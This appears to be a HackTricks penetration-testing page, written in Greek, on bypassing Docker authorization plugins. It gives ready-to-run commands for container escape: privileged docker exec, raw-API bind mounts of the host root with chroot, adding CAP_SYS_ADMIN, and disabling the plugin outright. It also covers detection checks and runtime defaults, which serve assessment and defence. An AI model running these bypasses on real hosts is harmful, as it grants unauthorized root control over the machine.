# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα runtime authorization plugins είναι ένα επιπλέον επίπεδο policy που αποφασίζει αν ένας caller μπορεί να εκτελέσει μια συγκεκριμένη ενέργεια του daemon. Το Docker είναι το κλασικό παράδειγμα. Από προεπιλογή, όποιος μπορεί να επικοινωνήσει με το Docker daemon έχει ουσιαστικά ευρύ έλεγχο πάνω του. Τα authorization plugins προσπαθούν να περιορίσουν αυτό το μοντέλο εξετάζοντας τον authenticated χρήστη και την API operation που ζητήθηκε και, στη συνέχεια, επιτρέποντας ή απορρίπτοντας το request σύμφωνα με την policy.

Αυτό το θέμα αξίζει τη δική του σελίδα, επειδή αλλάζει το exploitation model όταν ένας attacker έχει ήδη πρόσβαση σε Docker API ή σε χρήστη της ομάδας `docker`. Σε τέτοια περιβάλλοντα, το ερώτημα δεν είναι πλέον μόνο «μπορώ να φτάσω στο daemon;», αλλά και «προστατεύεται το daemon από authorization layer και, αν ναι, μπορεί αυτό το layer να παρακαμφθεί μέσω endpoints που δεν έχουν υποστηριχθεί, αδύναμου JSON parsing ή permissions για plugin management;»

## Λειτουργία

Όταν ένα request φτάνει στο Docker daemon, το authorization subsystem μπορεί να προωθήσει το context του request σε ένα ή περισσότερα εγκατεστημένα plugins. Το plugin βλέπει την ταυτότητα του authenticated χρήστη, τις λεπτομέρειες του request, επιλεγμένα headers και τμήματα του request ή του response body όταν το content type είναι κατάλληλο. Μπορούν να συνδεθούν πολλαπλά plugins σε chain και η πρόσβαση επιτρέπεται μόνο αν όλα τα plugins εγκρίνουν το request.

Αυτό το μοντέλο φαίνεται ισχυρό, αλλά η ασφάλειά του εξαρτάται πλήρως από το πόσο ολοκληρωμένα έχει κατανοήσει ο author της policy το API. Ένα plugin που αποκλείει το `docker run --privileged`, αλλά αγνοεί το `docker exec`, παραλείπει εναλλακτικά JSON keys όπως το top-level `Binds` ή επιτρέπει τη διαχείριση plugins, μπορεί να δημιουργήσει μια ψευδή αίσθηση περιορισμού, αφήνοντας ταυτόχρονα ανοιχτές άμεσες διαδρομές privilege-escalation.

## Συνήθεις Στόχοι Plugins

Σημαντικές περιοχές για policy review είναι:

- endpoints δημιουργίας containers
- πεδία του `HostConfig`, όπως `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` και επιλογές namespace-sharing
- η συμπεριφορά του `docker exec`
- endpoints διαχείρισης plugins
- οποιοδήποτε endpoint μπορεί να ενεργοποιήσει έμμεσα runtime actions εκτός του intended policy model

Ιστορικά, παραδείγματα όπως το `authz` plugin της Twistlock και απλά εκπαιδευτικά plugins όπως το `authobot` έκαναν αυτό το μοντέλο εύκολο στη μελέτη, επειδή τα policy files και τα code paths τους έδειχναν πώς υλοποιούνταν στην πράξη το endpoint-to-action mapping. Για εργασίες assessment, το σημαντικό μάθημα είναι ότι ο author της policy πρέπει να κατανοεί ολόκληρο το API surface και όχι μόνο τις πιο εμφανείς CLI commands.

## Κατάχρηση

Ο πρώτος στόχος είναι να μάθεις τι πραγματικά αποκλείεται. Αν το daemon απορρίψει μια ενέργεια, το error συχνά κάνει leak το όνομα του plugin, κάτι που βοηθά στον εντοπισμό του control που χρησιμοποιείται:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Αν χρειάζεστε ευρύτερο endpoint profiling, εργαλεία όπως το `docker_auth_profiler` είναι χρήσιμα, επειδή αυτοματοποιούν τη διαφορετικά επαναλαμβανόμενη εργασία ελέγχου των API routes και των JSON structures που επιτρέπονται πραγματικά από το plugin.

Αν το περιβάλλον χρησιμοποιεί custom plugin και μπορείτε να αλληλεπιδράσετε με το API, απαριθμήστε ποια object fields φιλτράρονται πραγματικά:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Αυτοί οι έλεγχοι είναι σημαντικοί, επειδή πολλές αποτυχίες authorization αφορούν συγκεκριμένα πεδία και όχι την έννοια συνολικά. Ένα plugin μπορεί να απορρίψει ένα μοτίβο CLI χωρίς να αποκλείσει πλήρως την ισοδύναμη δομή API.

### Πλήρες παράδειγμα: Το `docker exec` προσθέτει privilege μετά τη δημιουργία του container

Μια policy που αποκλείει τη δημιουργία privileged container, αλλά επιτρέπει τη δημιουργία unconfined container σε συνδυασμό με `docker exec`, μπορεί και πάλι να παρακαμφθεί:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Εάν ο daemon αποδεχτεί το δεύτερο βήμα, ο χρήστης έχει ανακτήσει μια προνομιούχα interactive διεργασία μέσα σε ένα container που ο συγγραφέας της policy πίστευε ότι ήταν περιορισμένο.

### Πλήρες Παράδειγμα: Bind Mount Μέσω Raw API

Ορισμένες ελαττωματικές policies ελέγχουν μόνο μία μορφή JSON. Εάν το bind mount του root filesystem δεν αποκλείεται με συνέπεια, το host μπορεί και πάλι να γίνει mount:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Η ίδια ιδέα μπορεί επίσης να εμφανίζεται στο `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Ο αντίκτυπος είναι πλήρης διαφυγή από το filesystem του host. Η ενδιαφέρουσα λεπτομέρεια είναι ότι το bypass προκύπτει από ελλιπή κάλυψη της policy και όχι από bug του kernel.

### Πλήρες παράδειγμα: Μη ελεγμένο Capability Attribute

Αν η policy παραλείψει να φιλτράρει ένα attribute που σχετίζεται με capability, ο attacker μπορεί να δημιουργήσει ένα container που ανακτά μια επικίνδυνη capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Μόλις υπάρχει το `CAP_SYS_ADMIN` ή μια αντίστοιχα ισχυρή capability, γίνονται προσβάσιμες πολλές τεχνικές breakout που περιγράφονται στα [capabilities.md](protections/capabilities.md) και [privileged-containers.md](privileged-containers.md).

### Πλήρες παράδειγμα: Απενεργοποίηση του Plugin

Εάν επιτρέπονται operations διαχείρισης plugin, το καθαρότερο bypass μπορεί να είναι η πλήρης απενεργοποίηση του ελέγχου:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Πρόκειται για αποτυχία πολιτικής σε επίπεδο control-plane. Το authorization layer υπάρχει, αλλά ο χρήστης του οποίου την πρόσβαση υποτίθεται ότι θα περιόριζε εξακολουθεί να έχει δικαίωμα να το απενεργοποιεί.

## Έλεγχοι

Αυτές οι εντολές αποσκοπούν στον εντοπισμό του κατά πόσο υπάρχει policy layer και κατά πόσο φαίνεται να είναι πλήρες ή επιφανειακό.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Μηνύματα άρνησης που περιλαμβάνουν το όνομα ενός plugin επιβεβαιώνουν την ύπαρξη authorization layer και συχνά αποκαλύπτουν την ακριβή υλοποίηση.
- Μια λίστα plugin που είναι ορατή στον attacker μπορεί να αρκεί για να διαπιστωθεί αν είναι δυνατές οι ενέργειες disable ή reconfigure.
- Μια policy που μπλοκάρει μόνο τις προφανείς ενέργειες CLI, αλλά όχι τα raw API requests, θα πρέπει να θεωρείται bypassable μέχρι να αποδειχθεί το αντίθετο.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Δεν είναι ενεργοποιημένο από προεπιλογή | Η πρόσβαση στον daemon είναι ουσιαστικά all-or-nothing, εκτός αν έχει ρυθμιστεί authorization plugin | incomplete plugin policy, blacklists αντί για allowlists, allowing plugin management, field-level blind spots |
| Podman | Δεν υπάρχει κοινό άμεσο ισοδύναμο | Το Podman συνήθως βασίζεται περισσότερο σε Unix permissions, rootless execution και αποφάσεις σχετικά με την έκθεση του API, παρά σε authz plugins τύπου Docker | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Διαφορετικό control model | Αυτά τα runtimes συνήθως βασίζονται σε socket permissions, node trust boundaries και controls του orchestrator σε ανώτερο επίπεδο, αντί για Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Χρησιμοποιεί authn/authz στα επίπεδα του API-server και του kubelet, όχι Docker authz plugins | Τα cluster RBAC και admission controls αποτελούν το κύριο policy layer | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |

{{#include ../../../banners/hacktricks-training.md}}
